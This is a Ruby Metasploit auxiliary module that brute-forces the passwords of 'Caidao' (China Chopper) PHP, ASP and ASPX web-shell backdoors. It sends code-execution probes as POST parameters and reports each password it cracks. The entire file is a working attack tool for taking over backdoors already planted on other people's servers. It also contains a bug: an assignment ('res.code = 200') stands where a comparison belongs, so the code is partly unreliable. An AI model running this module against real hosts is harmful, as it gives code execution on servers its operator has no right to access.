##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Chinese Caidao Backdoor Bruteforce',
      'Description'    => 'This module attempts to brute chinese caidao php/asp/aspx backdoor.',
      'Author'         => [ 'Nixawk' ],
      'References'     => 
        [
              [ 'URL', 'http://blog.csdn.net/nixawk/article/details/40430329']
        ],
      'License'        => MSF_LICENSE,  
    ))

    register_options(
      [
        OptString.new('TARGETURI', 
                      [ true, 
                        "The URI to authenticate against", 
                        "/backdoor.php" ]
                     ),
        OptEnum.new('TYPE',
                   [ true,
                      "backdoor type",
                      "PHP",
                     ["PHP", "ASP", "ASPX"]
                   ])
      ], self.class)
    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])
  end

  def backdoor_brute(uri, user, pass, payload, regexp)
    begin
      res = send_request_cgi({
          'uri'          =>  uri,
          'method'       =>  "POST",
          'vars_post'    =>  {
            'user'   => user,
            pass   => payload
           }
      })
    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEOUT
      print_error("#{peer} - Service failed to respond")
      return :abort
    end

    if res.code = 200 and regexp.match(res.body)
      print_good("#{peer} - Successful login: password - \"#{pass}\"")
      report_auth_info({
        :host        => rhost,
        :port        => rport,
        :sname       => (ssl ? 'https': 'http'),
        :user        => user,
        :pass        => pass
      })

      return :next_user
    end

    return
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)
    typ = datastore['TYPE']

    payload = nil
    regexp = /woo5woo/mi

    case typ
    when /php$/mi
      print_status("#{peer} - Trying to crack php backdoor")

      payload = '$_="5";echo "woo".$_."woo";'

    when /asp$/mi
      print_status("#{peer} - Trying to crack asp backdoor")

      payload = 'execute("response.write(""woo""):response.write(Len(""admin"")):response.write(""woo""):response.end")'

    when /aspx$/mi
      print_status("#{peer} - Trying to crack aspx backdoor")

      payload = 'Response.Write("woo");Response.Write(1+4);Response.Write("woo")'

    else
      print_error("#{peer} - Backddor type is not support")  
    end

    each_user_pass { |user, pass|
      print_status("#{peer} - Trying \"#{uri}\" : \"#{pass}\"")
      backdoor_brute(uri, user, pass, payload, regexp)
    }
  end
end  
